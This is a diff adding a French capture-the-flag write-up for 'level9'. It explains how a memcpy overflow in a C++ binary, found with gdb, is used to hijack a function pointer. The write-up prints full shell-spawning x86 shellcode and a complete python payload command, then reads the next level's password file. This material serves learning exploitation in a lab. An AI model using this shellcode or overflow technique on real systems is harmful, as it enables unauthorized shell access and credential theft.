@@ -1,0 +1,38 @@
+on trouve sur le home du level9 un binaire level 9
+
+on le desassemble avec gdb
+
+avec info fonction on voit que ce binaire vient d'un fichier cpp (on le voit grace a l'operateur new en autre)
+
+on voit dans le code en assembleur du main des appelle a des fonction avec des noms bizarre comme _ZN1NC2Ei
+en faisant info function et en comparant les addresses on voit que ces noms correspondent a des fonction plus compehensibles
+
+_Znwj@plt correspond a l'operateur new
+_ZN1NC2Ei corresspond a N::N(int) le constructeur de la classe N
+_ZN1N13setAnnotationEPc a N::setAnnotation(char*)
+
+les surcharges d'operateurs + et - bien qu'etant definis ne semblent pas etre utlise ni dans le main ni dans les fonctions appeles par le main
+
+on voit que dans le programme il y a un appel a memcpy qui copy l'entree du prgramme dans une chaine prealablement alouee
+on peut donc faire un buffer overflow sur ce memcpy
+
+on trouve que le segfault a lieu a partir de 109 char en entree
+en mettant plusieurs breakpoints on voit que le segfault a lieu lors de "=> 0x08048688 <+148>:	mov    %eax,0x4(%esp)"
+on veut modifier l'addresse sur laquelle pointe edx pour que lors de son call (L159) elle call le shell voulu a la place de la fonction attendu
+on met un breakpoint juste avant le segfault a l'adresse 0x0804a008 et on regarde les differents registres et ce qu'ils contiennent sans buffer overflow
+on voit que esp contient l'adresse du string sur lequel on overflow et que apres 108 char il y a une adresse
+cette adresse est celle de edx
+vu qu'il y a ensuite un call a *edx on peut faire pointer cette adresse sur l'adresse d'une fonction qui appelle un shell
+on va donc envoyer un payload de la forme "addresse de la fonction qui lance le shell" + "fonction qui lance le shell" + "buffer pour atteindre 108" + "pointeur sur l'addresse de la fonction qui lance le shell"
+
+on trouve un binaire qui lance un shell en ligne \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+on a l'adresse du debut de notre string qui est 0x804a008 + 4 = 0x804a00c 
+et celle du debut de notre programme peut etre juste apres donc 0x804a010
+
+on a donc notre payload qu'on peut comme precedement mettre dans une variable 
+a=`python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + 49 * "A" + "\x0c\xa0\x04\x08"'`
+
+on lance `./level9 $a` et on est sur le shell
+il reste plus qu'a cat /home/user/level10/.pass
+
